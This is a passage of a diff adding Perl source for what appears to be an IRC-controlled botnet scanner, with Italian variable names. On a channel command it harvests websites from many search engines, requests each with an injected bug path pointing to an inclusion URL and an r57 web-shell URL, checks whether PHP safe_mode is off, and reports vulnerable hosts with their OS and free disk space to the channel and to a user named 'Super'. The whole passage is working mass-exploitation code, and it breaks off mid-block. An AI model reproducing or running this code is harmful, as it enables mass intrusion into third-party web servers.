+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Virgilio");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Virgilio");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @highitlist=&highit($chiave);
+push ( my @tot, @highitlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13HispeedIt7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9HispeedIt Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13HispeedIt Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su HispeedIt");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su HispeedIt");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @highlist=&high($chiave);
+push ( my @tot, @highlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Hispeed7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Hispeed Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Hispeed Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Hispeed");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Hispeed");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @entlist=&entw($chiave);
+push ( my @tot, @entlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Entire7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Entire Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Entire Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Entire");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Entire");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @sapolist=&sapo($chiave);
+push ( my @tot, @sapolist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Sapo7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Sapo Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Sapo Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Sapo");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Sapo");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @gigalist=&giga($chiave);
+push ( my @tot, @gigalist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GigaBlast7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9GigaBlast Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13GigaBlast Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GigaBlast");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GigaBlast");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @uollist=&uol($chiave);
+push ( my @tot, @uollist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Uol7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Uol Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Uol Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Uol");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Uol");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @ylist=&yahoo($chiave);
+push(my @tot, @ylist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Yahoo7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Yahoo Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Yahoo Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Yahoo");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Yahoo");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @euroitlist=&euroit($chiave);
+push(my @tot, @euroitlist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13SpecialIt7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9SpecialIt Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13SpecialIt Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialIt");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialIt");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @eurodelist=&eurode($chiave);
+push(my @tot, @eurodelist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13SpecialDe7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9SpecialDe Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13SpecialDe Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialDe");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialDe");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @niglist=&nigma($chiave);
+push(my @tot, @niglist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Nigma.ru7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Nigma.ru Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Nigma.ru Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Nigma.ru");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Nigma.ru");
+}}
+}}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @eurocslist=&eurocs($chiave);
+push(my @tot, @eurocslist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13SpecialCs7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9SpecialCs Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13SpecialCs Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialCs");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialCs");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @eurodalist=&euroda($chiave);
+push(my @tot, @eurodalist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13SpecialDa7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9SpecialDa Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13SpecialDa Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialDa");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialDa");
+}}
+}}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @eurosvlist=&eurosv($chiave);
+push(my @tot, @eurosvlist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13SpecialSv7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9SpecialSv Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13SpecialSv Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialSv");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialSv");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @euroeslist=&euroes($chiave);
+push(my @tot, @euroeslist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13SpecialEs7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9SpecialEs Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13SpecialEs Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialEs");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialEs");
+}}
+}}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @euronolist=&eurono($chiave);
+push(my @tot, @euronolist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13SpecialNo7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9SpecialNo Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13SpecialNo Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
